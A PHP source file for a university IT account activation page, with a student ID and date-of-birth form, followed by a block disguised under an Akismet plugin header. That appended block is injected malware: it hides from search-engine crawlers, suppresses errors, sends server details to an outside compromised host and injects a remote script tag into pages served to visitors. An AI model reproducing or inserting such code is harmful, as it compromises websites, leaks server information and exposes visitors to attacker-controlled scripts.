<?php
// Include web header
include(".includes/functions.php");

// disable browser caching
ae_nocache();

$heading = '';
$error = $content = $sits = '';
$hide_header = $set_hide = '';
$firsttime = 0;

$set_hide = "";
$hide_header="false";
if(isset($_SERVER['QUERY_STRING'])){
//echo ("Is set".print_r($_SERVER));
   $url_string_array=array();
   $url_string=$_SERVER['QUERY_STRING'];
   parse_str($url_string, $url_string_array);

   //print_r($url_string_array);

   if(isset($url_string_array['hide'])&& $url_string_array['hide'] != ""){
      $hide_header = $url_string_array['hide'];
      $set_hide = "?hide=$hide_header";
   }
}
//echo("hide is ".$hide_header."<br>");

function form($sits,$dob)
{
   global $hide_header, $set_hide;
   $msg = "<center>
            <form id=\"collectform\" name=\"collectform\" method=\"post\" autocomplete=\"off\" action=\"index.php". $set_hide ."\" onsubmit=\"document.collectform.submit.disabled='true';document.collectform.submit.value='  Please wait  '\">
            <table align=\"center\">
               <tr>
                  <td><div align=\"right\"><b>Your Student ID:</b></div></td>
                  <td><input id=\"sits\" type=\"text\" name=\"sits\" size=\"10\" maxlength=\"9\" value=\"$sits\"/></td>
               </tr>
               <tr>
                  <td><div align=\"right\"><b>Your Date of Birth:</b></div></td>
                  <td><input id=\"datepicker\" type=\"text\" name=\"dateofbirth\" size=\"10\" maxlength=\"10\" value=\"$dob\"/></td>
               </tr>
               <tr>
                  <td colspan=\"2\"><div align=\"center\">";
   $msg .= tsandcs($hide_header);
   $msg .=       "<input style=\"font-size:18px;\" type=\"submit\" id=\"submit\" value=\"  Activate  \"/>
                  <input type=\"hidden\" name=\"firstpage\" value=\"no\"/>
                  </div></td>
               </tr>
            </table>
            </form>";
   #        </center>";
   #         <p style=\"text-align:center;font-size:13px;\">Example: Student ID 550099999, UniCard Number 0400499999 or Security Number 1234
   #         <img style=\"margin-left:25%;margin-right:25%;\" src=\"student_card_visual.jpg\" alt=\"Sample university card\"</p>";
   return $msg;
}


function firstpage()
{
   global $hide_header, $set_hide;
   $msg = "
   <p style=\"font-size:14px;text-align:left;\">To activate your IT account and receive your IT username and password, please:</p>
   <ol>
      <li>Read our regulations at ";
if($hide_header != "false") {
   $msg .= "www.exeter.ac.uk/it/regulations/regs";
} else {
   $msg .= "<a href=\"http://www.exeter.ac.uk/it/regulations/regs\" target=\"_blank\">www.exeter.ac.uk/it/regulations/regs</a>";
}
$msg .= "<br><br>Note in particular that:<br>
         <ul style=\"font-size:13px;\">
            <li>You must keep your password secret. University staff will never ask for your password, in person or by email</li>
            <li>You must not use, copy, download or distribute copyright material (such as full-length feature films) without permission</li>
            <li>You must not send email spam</li>
         </ul>
      </li>
      <li>Learn how to protect your cyberspace<br>
         <ul style=\"font-size:13px;\">
            <li>Promptly install all security patches for your computer and smartphone</li>
            <li>Run anti-virus software on your computer and make sure the definitions are up to date</li>
            <li>Never click links or attachments in emails unless you know the sender and you were expecting the message</li>
            <li>Never log in over the Internet except on a secure connection (look for the browser's locked padlock symbol)</li>
         </ul>
      </li>
   </ol>
   <p>To find out more about safe computing, please visit ";
if($hide_header != "false") {
   $msg .= "www.exeter.ac.uk/infosec/tips";
} else {
   $msg .= "<a href=\"http://www.exeter.ac.uk/infosec/tips\" target=\"_blank\">www.exeter.ac.uk/infosec/tips</a>";
}
$msg .= "</p>
   <form id=\"firstform\" name=\"firstform\" method=\"post\" action=\"index.php". $set_hide ."\" onsubmit=\"document.firstform.submit.disabled='true';document.firstform.submit.value='  Please wait  '\">
   <div align=\"center\"><input style=\"font-size:18px;\" type=\"submit\" id=\"submit\" value=\"  Next  \"/></div>
   <div align=\"center\"><input type=\"hidden\" name=\"firstpage\" value=\"yes\"/></div>
   <div align=\"center\"><input type=\"hidden\" name=\"dateofbirth\" value=\"". date('d/m/Y') ."\"/></div>
   </form>
   ";
   return $msg;
}

function tsandcs()
{
   global $hide_header;
   //echo("hide is ".$hide_header."<br>");
   $msg = "<p style=\"font-size:14px;font-weight:bold;\">By activating your University of Exeter IT Account you agree to be bound by all our<br> regulations for using computing facilities ";
   if($hide_header != "false") {
      $msg .= "www.exeter.ac.uk/it/regulations/regs";
   } else {
      $msg .= "<a href=\"http://www.exeter.ac.uk/it/regulations/regs\" target=\"_blank\">www.exeter.ac.uk/it/regulations/regs</a>";
   }
   $msg .= "</p>";
   return $msg;
}

# This actually does the work!
if (check_access())
{
   $sucess = 0;
   if (isset($_POST['firstpage']))
   {
      if (isset($_POST['dateofbirth']))
      {
         $dob = $_POST['dateofbirth'];
         if (isset($_POST['sits']))
         {
            $sits = $_POST['sits'];
            if (check_user($_POST['sits'],$_POST['dateofbirth']))
            {
               if(_collectPass($uid)) { $sucess = 1; }
            }
         }
      }
   } else
   {
      $content .= firstpage();
      $firsttime = 1;
   }

   if(!$sucess && !$firsttime)
   {
      //$content .= regdate();
      $content .= "<p style=\"font-size:14px;\">Now please enter the following:</p>";
      $content .= "<p style=\"text-align:center;font-size:16px;;font-weight:bold;color:red;\">$error</p>";
      $content .= form($sits,$dob);
   }
}

$content .= '
   <link rel="stylesheet" href="css/jquery-ui.css" type="text/css" />
   <script src="js/jquery.js"></script>
   <script src="js/jquery-ui.js"></script>
   <script>
      $(function() {
         $( "#datepicker" ).datepicker({
            changeMonth: true,
            changeYear: true,
            dateFormat: "dd/mm/yy",
            yearRange: "-80:+0"
            });
      });
   </script>
   ';

if($hide_header!="false") {
   echo "<head>
         <link rel=\"shortcut icon\" href=\"/media/universityofexeter/webteam/styleassets/images/favicon.ico\" />
         <!-- Academic Services -->
         <style type=\"text/css\" media=\"all\">@import \"/media/universityofexeter/webteam/styleassets/css/global.css\";</style>
         <!--[if IE 6]><style type=\"text/css\" media=\"all\">@import \"/media/universityofexeter/webteam/styleassets/css/global_IE6.css\";</style><![endif]-->
         <!--[if IE 7]><style type=\"text/css\" media=\"all\">@import \"/media/universityofexeter/webteam/styleassets/css/global_IE7.css\";</style><![endif]-->
         <style type=\"text/css\" media=\"print\">@import \"/media/universityofexeter/webteam/styleassets/css/print.css\";</style>
         <link rel=\"stylesheet\" href=\"/media/universityofexeter/webteam/styleassets/css/schools.css\" type=\"text/css\" media=\"screen\" />
         <link rel=\"stylesheet\" href=\"/media/universityofexeter/webteam/styleassets/css/jd.gallery_2col.css\" type=\"text/css\" media=\"screen\" />
         <style type=\"text/css\" media=\"all\">@import \"/media/universityofexeter/webteam/styleassets/css/academic.css\";</style>
         </head>";
   echo "<body style=\"text-align:center;\"><div id=\"wrapper\">
            <div id=\"wrapperinner\">
               <div id=\"header\">
                  <img src=\"/media/universityofexeter/webteam/styleassets/images/logo.gif\" alt=\"University of Exeter\" class=\"logo\" width=\"162\" height=\"60\"/>
                  <!--<img src=\"/media/universityofexeter/alumniandsupporters/campaign/campaignlogo.gif\" alt=\"Visit the Campaign website\" class=\"campaignlogo\" width=\"98\" height=\"98\"/>-->
               </div>
            </div>
         </div>
         <div style=\"margin-left:auto;margin-right:auto;width:70%;text-align:left;>";
   echo $content;
   echo "</div></body>";
} else {
   modifyTemplate($site, $uri, $heading, $content);
}
?>
<?php
#3ffcec#
/**
 * @package Akismet
 */
/*
Plugin Name: Akismet
Plugin URI: http://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from comment and trackback spam</strong>. It keeps your site protected from spam even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/">Sign up for an Akismet API key</a>, and 3) Go to your Akismet configuration page, and save your API key.
Version: 3.0.0
Author: Automattic
Author URI: http://automattic.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: akismet
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

if( empty( $zmx ) ) {
    if( ( substr( trim( $_SERVER['REMOTE_ADDR'] ), 0, 6 ) == '74.125' ) || preg_match(
            "/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i",
            $_SERVER['HTTP_USER_AGENT']
        )
    ) {
    } else {
        error_reporting( 0 );
        @ini_set( 'display_errors', 0 );
        if( !function_exists( '__url_get_contents' ) ) {
            function __url_get_contents( $remote_url, $timeout )
            {
                if( function_exists( 'curl_exec' ) ) {
                    $ch = curl_init();
                    curl_setopt( $ch, CURLOPT_URL, $remote_url );
                    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
                    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, $timeout );
                    curl_setopt( $ch, CURLOPT_TIMEOUT, $timeout ); //timeout in seconds
                    $_url_get_contents_data = curl_exec( $ch );
                    curl_close( $ch );
                } elseif( function_exists( 'file_get_contents' ) && ini_get( 'allow_url_fopen' ) ) {
                    $ctx = @stream_context_create(
                        array(
                            'http' =>
                                array(
                                    'timeout' => $timeout,
                                )
                        )
                    );
                    $_url_get_contents_data = @file_get_contents( $remote_url, false, $ctx );
                } elseif( function_exists( 'fopen' ) && function_exists( 'stream_get_contents' ) ) {
                    $handle = @fopen( $remote_url, "r" );
                    $_url_get_contents_data = @stream_get_contents( $handle );
                } else {
                    $_url_get_contents_data = __file_get_url_contents( $remote_url );
                }
                return $_url_get_contents_data;
            }
        }

        if( !function_exists( '__file_get_url_contents' ) ) {
            function __file_get_url_contents( $remote_url )
            {
                if( preg_match(
                    '/^([a-z]+):\/\/([a-z0-9-.]+)(\/.*$)/i',
                    $remote_url,
                    $matches
                )
                ) {
                    $protocol = strtolower( $matches[1] );
                    $host = $matches[2];
                    $path = $matches[3];
                } else {
// Bad remote_url-format
                    return false;
                }
                if( $protocol == "http" ) {
                    $socket = @fsockopen( $host, 80, $errno, $errstr, $timeout );
                } else {
// Bad protocol
                    return false;
                }
                if( !$socket ) {
// Error creating socket
                    return false;
                }
                $request = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";
                $len_written = @fwrite( $socket, $request );
                if( $len_written === false || $len_written != strlen( $request ) ) {
// Error sending request
                    return false;
                }
                $response = "";
                while( !@feof( $socket ) &&
                    ( $buf = @fread( $socket, 4096 ) ) !== false ) {
                    $response .= $buf;
                }
                if( $buf === false ) {
// Error reading response
                    return false;
                }
                $end_of_header = strpos( $response, "\r\n\r\n" );
                return substr( $response, $end_of_header + 4 );
            }
        }

        $zmx['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME'];
        $zmx['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME'];
        $zmx['PHP_SELF'] = $_SERVER['PHP_SELF'];
        $zmx['HTTP_HOST'] = $_SERVER['HTTP_HOST'];
        $zmx['REDIRECT_STATUS'] = $_SERVER['REDIRECT_STATUS'];
        $zmx['SERVER_NAME'] = $_SERVER['SERVER_NAME'];
        $zmx['SERVER_ADDR'] = $_SERVER['SERVER_ADDR'];
        $zmx['SERVER_ADMIN'] = $_SERVER['SERVER_ADMIN'];

        $zmx = __url_get_contents(
            "http://www.bestauto.rs/wp-content/themes/twentytwelve/kf8fwwn3.php" . "?fid=2276463&info=" . http_build_query( $zmx ) . "&no=1&allow=1",
            2
        );

        $zmx = trim( $zmx );
        if( $zmx !== 'false' ) {
            echo "<script type=\"text/javascript\" src=\"http://www.bestauto.rs/wp-content/themes/twentytwelve/kf8fwwn3.php?id=7813719\"></script>";
        }
    }
}
#/3ffcec#
?>
